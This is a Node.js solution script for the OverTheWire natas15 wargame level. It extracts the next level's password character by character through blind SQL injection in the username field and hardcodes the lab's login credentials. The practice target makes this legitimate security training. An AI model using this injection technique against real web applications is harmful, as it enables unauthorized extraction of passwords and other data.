#!/env/node

var request = require('request');

var test = "This user exists";
var natas15 = 'http://natas15.natas.labs.overthewire.org/';
var regx = /This user exists/;
var password = '';

var alphaNumeric = range('a', 'z').concat(range('A', 'Z'), range('0', '9'));

function range(start,stop) {
  var result=[];
  for (var idx=start.charCodeAt(0),end=stop.charCodeAt(0); idx <=end; ++idx){
    result.push(String.fromCharCode(idx));
  }
  return result;
}

function callback(letter, error, response, body) {
  if (!error && response.statusCode == 200) {
    if (regx.test(body)) {
      password += letter;
      console.log(password);
    }
  }
}

function doRequest(pos, alphaChar) {
  var letter = alphaChar;
  var r = request.post(natas15, {
    auth: {
      'user': 'natas15',
      'pass': 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'
    }
  }, callback.bind(this, letter));

  var form = r.form();
  form.append('debug', 'true');
  form.append('username', 'natas16" AND SUBSTRING(password, ' + pos + ', 1) LIKE BINARY "' + letter);
}

function main() {
  for (var i=0, l=64; i<l; i+=1) {
    for (var j=0, alpha=alphaNumeric.length; j<alpha; j+=1) {
      doRequest(i, alphaNumeric[j]);
    }
  }
}
main();
